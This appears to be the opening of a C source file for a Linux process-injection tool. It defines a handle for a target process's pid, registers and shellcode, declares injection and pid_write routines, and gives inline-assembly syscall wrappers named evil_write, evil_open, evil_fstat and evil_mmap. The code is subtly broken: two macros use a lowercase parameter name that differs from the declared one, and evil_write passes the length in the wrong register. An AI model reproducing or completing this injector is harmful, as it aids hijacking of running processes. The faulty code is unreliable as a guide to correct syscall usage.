#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>

#define PAGE_ALIGN(x) ( x & ~(PAGE_SIZE-1))
#define PAGE_ALIGN_UP(X) ( PAGE_ALIGN(x) + PAGE_SIZE)
#define WORD_ALIGN(X) ( (x+7) & ~7)
#define BASE_ADDRESS 0x00100000

typedef struct handle {
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    Elf64_Shdr *shdr;
    uint8_t *mem;
    pid_t pid;
    uint8_t *shellcode;
    char *exec_path;
    uint64_t base;
    uint64_t stack;
    uint64_t entry;
    struct user_regs_struct pt_reg;
}handle_t;

static inline volatile void* evil_mmap(void *, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t) __attribute__((aligned(8),__always_inline__));
uint64_t injection_code(void *)__attribute__((aligned(8)));
uint64_t get_text_base(pid_t);
int pid_write(int, void *, const void *, size_t);
uint8_t* create_fn_shellcode(void(*fn)(), size_t len);

void *f1 = injection_code;
void *f2 = get_text_base;

static inline volatile long evil_write(long fd, char *buf, unsigned long len) {
    long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdi\n"
        "mov $1, %%rax\n"
        "syscall"::"g"(fd),"g"(buf),"g"(len)
        );
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline volatile int evil_fstat(long fd,  struct stat *buf) {
    long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov $5, %%rax\n"
        "syscall"::"g"(fd),"g"(buf)
        );
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline volatile int evil_open(const char *path, unsigned long flags) {
    long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov $2, %%rax\n"
        "syscall"::"g"(path),"g"(flags)
        );
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline volatile void* evil_mmap(void *addr, uint64_t len, uint64_t prot, uint64_t flags, uint64_t fd, uint64_t off) {
    long mmap_fd = fd;
    unsigned long mmap_off = off;
    unsigned long mmap_flags = flags;
    unsigned long ret;
    __asm__ volatile(
        "mov %0, %%rdi\n"
        "mov %1, %%rsi\n"
        "mov %2, %%rdx\n"
        "mov %3, %%r10\n"
        "mov %4, %%r8\n"
        "mov %5, %%r9\n"
        "mov $9, %%rax\n"
        "syscall"::"g"(addr),"g"(len),"g"(prot),"g"(flags),"g"(mmap_fd),"g"(mmap_off)
        );
    asm("mov %%rax, %0":"=r"(ret));
    return (void *)ret;
}
